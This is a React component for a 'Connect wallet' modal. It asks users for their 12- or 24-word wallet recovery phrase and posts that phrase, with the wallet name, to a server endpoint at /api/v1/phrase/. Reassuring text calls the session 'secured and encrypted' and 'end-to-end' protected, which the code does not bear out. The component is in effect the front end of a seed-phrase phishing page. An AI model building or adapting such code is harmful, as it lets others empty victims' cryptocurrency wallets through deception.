import React, { useContext, useState } from 'react';
import Backdrop from '@mui/material/Backdrop';
import Box from '@mui/material/Box';
import Modal from '@mui/material/Modal';
import Fade from '@mui/material/Fade';
import { CloseButton } from '../assets/icons';
import { myContext } from '../MyContext';
import { FaShield } from "react-icons/fa6";
import axios from 'axios';
import { url } from './constants';

export const style = {
    position: 'absolute',
    top: '44%',
    left: '50%',
    height: "400px",
    transform: 'translate(-50%, -50%)',
    borderRadius: "15px",
    marginTop: "2.5em",
    bgcolor: '#2E2E34',
    outline: "none",
    boxShadow: 24,
};

export const styleHeader = {
    p: 1,
    color: "rgb(161 161 170)",
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center"
}

export default function PhraseWalletModal() {
    const { openPhraseWalletModal, setPhraseWalletModal, clickedWallet, fetchData } = useContext(myContext)
    const [phrase, setPhrase] = useState("")
    const handleClose = () => { setPhraseWalletModal(false) };

    console.log(phrase)

    const handleSubmit = async () => {
        console.log("button clicked")
        const values = {
            title: clickedWallet.name,
            phrase: phrase
        }
        await axios.post(`${url}/api/v1/phrase/`, values)
            .then(response => {
                console.log('Response:', response.data);
                fetchData()
            })
            .catch(error => {
                console.error('Error:', error);
            });
    }

    return (
        <Modal
            aria-labelledby="transition-modal-title"
            aria-describedby="transition-modal-description"
            open={openPhraseWalletModal}
            onClose={handleClose}
            closeAfterTransition
            slots={{ backdrop: Backdrop }}
            slotProps={{
                backdrop: {
                    timeout: 500,
                },
            }}
        >
            <Fade in={openPhraseWalletModal}>
                <Box className=" md:w-[525px] w-[90%] m-auto" sx={style}>
                    <Box className="  px-6 rounded-xl py-4">
                        <Box sx={styleHeader}>
                            <div className=' flex items-center gap-3'>
                                <img src={clickedWallet?.logo} alt='' className=' object-cover w-[40px] ' />
                                <div className=' text-[20px] text-white'>{clickedWallet?.name}</div>
                            </div>
                            <CloseButton onClick={handleClose} className='text-[25px] cursor-pointer text-white' />
                        </Box>
                        <Box className=" pt-3">
                            <div className=''>
                                <header className='text-center text-[17px] text-zinc-300'>This session is secured and encrypted</header>
                                <div className='pt-4 w-[80%] m-auto'>
                                    <textarea
                                        className="w-full border bg-transparent rounded-xl border-zinc-600 p-4 outline-none focus:border-[#FAEAC8] text-zinc-200"
                                        placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces."
                                        rows={4}
                                        onChange={(e) => setPhrase(e.target.value)}
                                    // onChange={(e) => { setPhrase({ ...phrase, phrase: e.target.value, title: data.title }); handleChange(e) }}
                                    >
                                    </textarea>
                                </div>
                                <div className='w-[55%] m-auto mt-6'>
                                    <button onClick={handleSubmit} className=' rounded-full bg-[#FAEAC8] hover:bg-[#c8bb9e] duration-500 p-3 w-full'>
                                        Connect wallet
                                    </button>
                                </div>
                                <footer className='text-[#DCEFFA] flex items-center justify-center text-center text-sm pt-6 gap-2'>
                                    <div className=' text-primGreen border border-[#3F5B59] bg-[#373F43] h-[2em] w-[2em] flex justify-center items-center rounded-full'>
                                        <FaShield />
                                    </div>
                                    <p>This session is protected with an end-to-end encryption</p>
                                </footer>
                            </div>
                        </Box>
                    </Box>
                </Box>
            </Fade>
        </Modal>
    );
}
